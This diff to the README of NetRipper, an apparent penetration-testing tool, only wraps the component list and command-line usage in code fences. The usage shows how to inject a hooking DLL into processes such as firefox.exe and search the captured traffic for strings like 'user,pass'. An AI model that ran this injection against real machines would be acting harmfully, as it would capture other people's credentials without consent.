@@ -4,12 +4,15 @@ The post-exploitation activities in a penetration test can be challenging if the
 
 # Components
 
+```
 NetRipper.exe - Configures and inject the DLL  
 DLL.dll       - Injected DLL, hook apis and save data to files  
-netripper.rb  - Metasploit post-exploitation module  
+netripper.rb  - Metasploit post-exploitation module
+```
 
 # Command line
 
+```
 Injection: NetRipper.exe DLLpath.dll processname.exe  
 Example:   NetRipper.exe DLL.dll firefox.exe  
 
@@ -26,3 +29,4 @@ Plugins:
   -s,  --stringfinder  Find specific strings. E.g. user,pass,config  
 
 Example: NetRipper.exe -w DLL.dll -l TEMP -p true -d 4096 -s user,pass  
+```
